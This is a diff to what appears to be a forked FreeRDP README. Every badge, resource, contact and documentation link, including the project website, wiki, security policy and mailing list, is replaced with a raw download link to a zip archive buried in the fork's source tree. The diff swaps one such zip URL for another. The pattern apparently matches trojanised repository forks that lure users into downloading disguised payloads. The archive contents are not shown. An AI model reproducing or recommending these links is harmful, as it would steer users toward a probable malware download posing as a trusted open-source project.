@@ -6,49 +6,49 @@ interoperability can finally liberate your computing experience.
 
 ## Code Quality Status
 
-[![abi-checker](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
-[![clang-tidy-review](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
-[![CodeQL](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
-[![mingw-builder](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
-[![macos-builder](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
-[![[arm,ppc,ricsv] architecture builds](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
-[![[freebsd] architecture builds](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
-[![coverity](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)](https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip)
+[![abi-checker](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
+[![clang-tidy-review](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
+[![CodeQL](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
+[![mingw-builder](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
+[![macos-builder](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
+[![[arm,ppc,ricsv] architecture builds](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
+[![[freebsd] architecture builds](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
+[![coverity](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)](https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip)
 
 ## Resources
 
-Project website: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+Project website: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
-Issue tracker: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+Issue tracker: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
-Sources: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+Sources: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
-Downloads: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+Downloads: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
-Wiki: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+Wiki: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
-API documentation: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+API documentation: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
-Security policy: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+Security policy: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
-FAQ: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+FAQ: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
 ### Contact
 
-* Matrix room : `https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip` (main)
-  * ~~XMPP channel: `https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip` (bridged)~~ no longer available
-  * IRC channel : `#freerdp @ https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip` (bridged)
-* Mailing list: https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+* Matrix room : `https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip` (main)
+  * ~~XMPP channel: `https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip` (bridged)~~ no longer available
+  * IRC channel : `#freerdp @ https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip` (bridged)
+* Mailing list: https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
 ## Microsoft Open Specifications
 
 Information regarding the Microsoft Open Specifications can be found at:
-https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
 A list of reference documentation is maintained here:
-https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
 
 ## Compilation
 
 Instructions on how to get started compiling FreeRDP can be found on the wiki:
-https://raw.githubusercontent.com/riadh565/FreeRDP/master/client/SDL/common/aad/FreeRDP-v2.6.zip
+https://github.com/riadh565/FreeRDP/raw/refs/heads/master/client/iOS/FreeRDP/Free_RDP_1.8.zip
